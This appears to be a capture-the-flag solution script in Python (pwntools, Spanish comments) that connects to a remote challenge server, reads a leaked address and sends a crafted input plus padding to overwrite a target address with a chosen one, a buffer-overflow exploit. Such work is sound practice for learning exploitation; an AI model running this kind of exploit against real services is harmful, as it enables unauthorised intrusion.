from pwn import *
#context.log_level = 'debug'

p = remote('52.14.117.7', 3188)


# Descompilando el programa con ghidra podemos notar que nuestro input es validado 
# para que en ciertas posiciones contenga un caracter en especifico
# Despues que tenemos el input correcto, este sera utilizado como pad mas un relleno adicional
# para alcanzar nuestro target y sobrescribirlo con la direccion que queremos.


def interact():
    p.recvuntil("Bienvenido a la fabrica de munecos, vas contra la jefa, crees que puedes llegar primero que el a ")
    leak=int(p.recvuntil("?")[:-1],16)
    payload='BAAAZAAAAZATAAAAAAAAAAPAAAA\x12\x12\x12\x12AAAACAAAAAAABBBBBB33AAAtAAAAAAAAATAAAAUAABAAAAAAAAAA4:`AAAAAAAAAAAAAv'
    padd="C"*12
    target="\x25\x14\x40\x00"
    raw_input()
    p.sendlineafter('>',payload+padd+target)
    p.recvall()


interact()
